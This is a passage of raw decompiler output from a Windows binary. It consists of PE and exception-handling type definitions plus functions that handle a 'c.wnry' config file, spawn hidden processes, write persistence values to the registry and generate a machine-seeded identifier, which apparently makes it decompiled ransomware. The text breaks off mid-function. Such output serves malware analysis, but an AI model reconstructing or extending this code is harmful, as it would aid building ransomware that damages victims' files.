typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef unsigned short    wchar16;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
};

typedef struct SC_HANDLE__ SC_HANDLE__, *PSC_HANDLE__;

typedef struct SC_HANDLE__ * SC_HANDLE;

struct SC_HANDLE__ {
    int unused;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ulong DWORD;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

typedef void * HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef CHAR * LPCSTR;

typedef LONG * PLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef LARGE_INTEGER * PLARGE_INTEGER;

typedef WCHAR * LPWSTR;

typedef CONTEXT * PCONTEXT;

typedef WCHAR * LPCWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTPROV;

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME * LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (* FARPROC)(void);

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HKEY__ * HKEY;

typedef HKEY * PHKEY;

typedef DWORD * LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD * PDWORD;

typedef struct _FILETIME FILETIME;

typedef HANDLE HGLOBAL;

typedef struct HINSTANCE__ * HINSTANCE;

typedef void * LPCVOID;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ * HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef void (* PMFN)(void *);

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;


// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

typedef struct PMD PMD, *PPMD;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor * pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

typedef struct _s_CatchableType CatchableType;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType * arrayOfCatchableTypes[0];
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (* pForwardCompat)(void);
    CatchableTypeArray * pCatchableTypeArray;
};

typedef LONG LSTATUS;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




bool FUN_00401000(void *param_1,int param_2)

{
  FILE *_File;
  size_t sVar1;
  bool bVar2;
  char *_Mode;
  
  if (param_2 == 0) {
    _Mode = &DAT_0040e018;
  }
  else {
    _Mode = &DAT_0040e01c;
  }
  _File = fopen(s_c_wnry_0040e010,_Mode);
  if (_File == (FILE *)0x0) {
    bVar2 = false;
  }
  else {
    if (param_2 == 0) {
      sVar1 = fwrite(param_1,0x30c,1,_File);
    }
    else {
      sVar1 = fread(param_1,0x30c,1,_File);
    }
    bVar2 = sVar1 != 0;
    fclose(_File);
  }
  return bVar2;
}



undefined4 FUN_00401064(LPSTR param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  LPSTR *ppCVar4;
  undefined4 uVar5;
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;
  
  local_58.cb = 0x44;
  ppCVar4 = &local_58.lpReserved;
  for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  local_14.hProcess = (HANDLE)0x0;
  local_14.hThread = (HANDLE)0x0;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar5 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 == 0) {
    uVar5 = 0;
  }
  else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_14.hProcess,param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar5;
}



undefined4 FUN_004010fd(int param_1)

{
  size_t sVar1;
  LSTATUS LVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  bool bVar6;
  HKEY hKey;
  BYTE local_2e0;
  undefined4 local_2df;
  undefined4 local_d8 [5];
  undefined4 local_c4 [45];
  DWORD local_10;
  int local_c;
  HKEY local_8;
  
  puVar4 = (undefined4 *)u_Software__0040e04c;
  puVar5 = local_d8;
  for (iVar3 = 5; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  local_2e0 = '\0';
  local_8 = (HKEY)0x0;
  puVar4 = local_c4;
  for (iVar3 = 0x2d; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  puVar4 = &local_2df;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  wcscat((wchar_t *)local_d8,(wchar_t *)&PTR_Rsrc_XIA_80a_409_2096999__0040e034);
  local_c = 0;
  do {
    if (local_c == 0) {
      hKey = (HKEY)0x80000002;
    }
    else {
      hKey = (HKEY)0x80000001;
    }
    RegCreateKeyW(hKey,(LPCWSTR)local_d8,&local_8);
    if (local_8 != (HKEY)0x0) {
      if (param_1 == 0) {
        local_10 = 0x207;
        LVar2 = RegQueryValueExA(local_8,&DAT_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,&local_2e0,
                                 &local_10);
        bVar6 = LVar2 == 0;
        if (bVar6) {
          SetCurrentDirectoryA((LPCSTR)&local_2e0);
        }
      }
      else {
        GetCurrentDirectoryA(0x207,(LPSTR)&local_2e0);
        sVar1 = strlen((char *)&local_2e0);
        LVar2 = RegSetValueExA(local_8,&DAT_0040e030,0,1,&local_2e0,sVar1 + 1);
        bVar6 = LVar2 == 0;
      }
      RegCloseKey(local_8);
      if (bVar6) {
        return 1;
      }
    }
    local_c = local_c + 1;
    if (1 < local_c) {
      return 0;
    }
  } while( true );
}



void FUN_00401225(int param_1)

{
  size_t sVar1;
  int iVar2;
  int iVar3;
  uint _Seed;
  int iVar4;
  undefined4 *puVar5;
  WCHAR *pWVar6;
  int iVar7;
  WCHAR local_19c;
  undefined4 local_19a [99];
  DWORD local_c;
  uint local_8;
  
  local_19c = DAT_0040f874;
  local_c = 399;
  puVar5 = local_19a;
  for (iVar3 = 99; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  GetComputerNameW(&local_19c,&local_c);
  local_8 = 0;
  _Seed = 1;
  sVar1 = wcslen(&local_19c);
  if (sVar1 != 0) {
    pWVar6 = &local_19c;
    do {
      _Seed = _Seed * (ushort)*pWVar6;
      local_8 = local_8 + 1;
      pWVar6 = pWVar6 + 1;
      sVar1 = wcslen(&local_19c);
    } while (local_8 < sVar1);
  }
  srand(_Seed);
  iVar3 = rand();
  iVar7 = 0;
  iVar4 = iVar3 % 8 + 8;
  if (0 < iVar4) {
    do {
      iVar2 = rand();
      *(char *)(iVar7 + param_1) = (char)(iVar2 % 0x1a) + 'a';
      iVar7 = iVar7 + 1;
    } while (iVar7 < iVar4);
  }
  for (; iVar7 < iVar3 % 8 + 0xb; iVar7 = iVar7 + 1) {
    iVar4 = rand();
    *(char *)(iVar7 + param_1) = (char)(iVar4 % 10) + '0';
  }
  *(undefined *)(iVar7 + param_1) = 0;
  return;
}



undefined4 * FUN_004012fd(void)

{
  undefined4 uVar1;
  undefined4 *extraout_ECX;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  FUN_004017dd();
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_004017dd();
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_00402a46();
  uVar1 = *(undefined4 *)(unaff_EBP + -0xc);
  extraout_ECX[0x132] = 0;
  extraout_ECX[0x133] = 0;
  extraout_ECX[0x134] = 0;
  extraout_ECX[0x135] = 0;
  *extraout_ECX = &PTR_FUN_004081d8;
  *in_FS_OFFSET = uVar1;
  return extraout_ECX;
}



void * __thiscall FUN_0040135e(void *param_1_00,byte param_1)

{
  FUN_0040137a();
  if ((param_1 & 1) != 0) {
    operator_delete(param_1_00);
  }
  return param_1_00;
}



void FUN_0040137a(void)

{
  undefined4 *extraout_ECX;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  *extraout_ECX = &PTR_FUN_004081d8;
  *(undefined4 *)(unaff_EBP + -4) = 2;
  FUN_004013ce();
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_00402a6f();
  *(undefined *)(unaff_EBP + -4) = 0;
  FUN_0040181b();
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0040181b();
  *in_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return;
}



undefined4 __fastcall FUN_004013ce(int param_1)

{
  undefined *puVar1;
  int iVar2;
  int iVar3;
  
  FUN_004018b9();
  FUN_004018b9();
  puVar1 = *(undefined **)(param_1 + 0x4c8);
  iVar3 = 0x100000;
  if (puVar1 != (undefined *)0x0) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4c8));
    *(undefined4 *)(param_1 + 0x4c8) = 0;
  }
  puVar1 = *(undefined **)(param_1 + 0x4cc);
  if (puVar1 != (undefined *)0x0) {
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4cc));
    *(undefined4 *)(param_1 + 0x4cc) = 0;
  }
  return 1;
}



undefined4 __thiscall FUN_00401437(int param_1_00,int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  HGLOBAL pvVar2;
  
  iVar1 = FUN_00401861(param_1);
  if (iVar1 != 0) {
    if (param_1 != 0) {
      FUN_00401861(0);
    }
    pvVar2 = GlobalAlloc(0,0x100000);
    *(HGLOBAL *)(param_1_00 + 0x4c8) = pvVar2;
    if (pvVar2 != (HGLOBAL)0x0) {
      pvVar2 = GlobalAlloc(0,0x100000);
      *(HGLOBAL *)(param_1_00 + 0x4cc) = pvVar2;
      if (pvVar2 != (HGLOBAL)0x0) {
        *(undefined4 *)(param_1_00 + 0x4d4) = param_2;
        *(undefined4 *)(param_1_00 + 0x4d0) = param_3;
        return 1;
      }
    }
  }
  return 0;
}



HGLOBAL __thiscall FUN_004014a6(int param_1_00,LPCSTR param_1,uint *param_2)

{
  HGLOBAL pvVar1;
  HANDLE hFile;
  int iVar2;
  HGLOBAL pvVar3;
  undefined4 *in_FS_OFFSET;
  int local_248;
  undefined4 local_244;
  undefined local_240;
  undefined4 local_23f;
  undefined2 uStack571;
  undefined uStack569;
  uint local_238;
  uint local_234;
  undefined local_230 [512];
  undefined4 local_30;
  HGLOBAL local_2c;
  uint local_28;
  int local_24;
  uint local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_004081e0;
  puStack16 = &DAT_004076f4;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  pvVar3 = (HGLOBAL)0x0;
  local_30 = 0;
